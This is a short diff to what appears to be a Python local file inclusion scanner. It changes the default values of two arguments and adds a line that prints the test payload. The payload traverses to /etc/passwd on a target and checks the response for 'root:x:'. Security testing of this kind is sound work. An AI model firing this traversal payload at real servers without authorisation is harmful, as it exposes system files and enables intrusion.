@@ -41,8 +41,8 @@ def main():
     parser.add_argument("-s", "--path", default="", help="LFI base path")
     parser.add_argument("--max", default=1000, type=int)
     parser.add_argument("--param", default="file", help="LFI parameter name")
-    parser.add_argument("--path-starting", default="file", help="LFI parameter starting point (example: file://)")
-    parser.add_argument("--path-ending", default="file", help="LFI parameter ending point (example: *percent_sign*23 for hashtag)")
+    parser.add_argument("--path-starting", default="", help="LFI parameter starting point (example: file://)")
+    parser.add_argument("--path-ending", default="", help="LFI parameter ending point (example: *percent_sign*23 for hashtag)")
 
     args = parser.parse_args()
 
@@ -65,6 +65,7 @@ def main():
     print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {base}")
 
     test_url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../etc/passwd{args.path_ending}"
+    print(f"{Fore.CYAN}[/]{Style.RESET_ALL} Example payload: {test_url}")
     test = requests.get(test_url, timeout=3)
 
     if "root:x:" not in test.text:
